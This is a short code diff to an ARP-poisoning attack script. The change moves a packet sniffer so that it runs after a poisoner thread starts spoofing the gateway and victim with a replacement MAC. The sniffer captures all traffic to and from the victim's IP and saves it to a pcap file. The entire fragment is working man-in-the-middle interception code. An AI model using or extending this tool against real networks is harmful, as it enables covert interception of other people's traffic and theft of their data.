@@ -52,14 +52,11 @@ string_of_poison = Thread(target=arpPoison.poisoner, args=(gateway_IP=p.gatewayI
                                                            new_MAC=p.replaceMAC, verbose=verbosity,
                                                            duration=p.duration))
 
-duration = p.duration
-
-start_time = time.time()
-packets = sniff(filter="ip host {}".format(p.victimIP), iface=p.interface, stop_filter=_check_timeout(start_time, duration + 1))
-
 if p.verbose:
     print("Attack start")
 string_of_poison.start()
+packets = sniff(filter="ip host {}".format(p.victimIP), iface=p.interface, timeout=p.duration + 1)
+
 string_of_poison.join()
 
 wrpcap("Capture_file_{}_{}.pcap".format(time.time(), p.victimIP), packets)
